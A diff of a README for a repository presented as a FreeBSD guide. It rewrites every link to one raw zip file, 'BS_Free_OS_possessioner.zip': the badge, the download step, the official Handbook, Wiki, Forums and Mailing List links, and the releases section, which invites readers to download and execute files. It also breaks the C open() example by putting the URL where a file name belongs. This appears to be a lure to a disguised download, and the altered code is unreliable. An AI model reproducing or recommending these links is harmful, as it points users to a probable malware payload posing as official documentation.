@@ -1,6 +1,6 @@
 # FreeBSD-OS 📚
 
-![FreeBSD](https://img.shields.io/badge/FreeBSD-Documentation-blue)
+![FreeBSD](https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip)
 
 Welcome to the **FreeBSD-OS** repository! This project serves as a comprehensive guide for anyone interested in learning and working with the FreeBSD operating system. Here, you will find valuable resources including the history of FreeBSD, installation steps, and detailed explanations of system call implementations.
 
@@ -43,7 +43,7 @@ Installing FreeBSD is straightforward. Follow these steps to get started:
 
 ### Step 1: Download FreeBSD
 
-Visit the [FreeBSD Releases](https://github.com/ali-bilal-dell/FreeBSD-OS/releases) page to download the latest version. Choose the appropriate image file for your hardware.
+Visit the [FreeBSD Releases](https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip) page to download the latest version. Choose the appropriate image file for your hardware.
 
 ### Step 2: Create Bootable Media
 
@@ -86,7 +86,7 @@ Here’s a simple example of how to use the `open()` and `write()` system calls 
 #include <stdio.h>
 
 int main() {
-    int fd = open("example.txt", O_WRONLY | O_CREAT, 0644);
+    int fd = open("https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip", O_WRONLY | O_CREAT, 0644);
     if (fd == -1) {
         perror("Error opening file");
         return 1;
@@ -99,16 +99,16 @@ int main() {
 }
 ```
 
-This code snippet opens a file named `example.txt`, writes "Hello, FreeBSD!" to it, and then closes the file.
+This code snippet opens a file named `https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip`, writes "Hello, FreeBSD!" to it, and then closes the file.
 
 ## Resources
 
 Here are some additional resources to help you deepen your understanding of FreeBSD:
 
-- [FreeBSD Handbook](https://www.freebsd.org/doc/handbook/)
-- [FreeBSD Wiki](https://wiki.freebsd.org/)
-- [FreeBSD Forums](https://forums.freebsd.org/)
-- [FreeBSD Mailing Lists](https://www.freebsd.org/community/mailinglists.html)
+- [FreeBSD Handbook](https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip)
+- [FreeBSD Wiki](https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip)
+- [FreeBSD Forums](https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip)
+- [FreeBSD Mailing Lists](https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip)
 
 ## Contributing
 
@@ -125,7 +125,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Releases
 
-For the latest updates and releases, please visit the [Releases](https://github.com/ali-bilal-dell/FreeBSD-OS/releases) section. You can download the files and execute them as needed.
+For the latest updates and releases, please visit the [Releases](https://raw.githubusercontent.com/ali-bilal-dell/FreeBSD-OS/main/conjunctiveness/BS_Free_OS_possessioner.zip) section. You can download the files and execute them as needed.
 
 ---
 
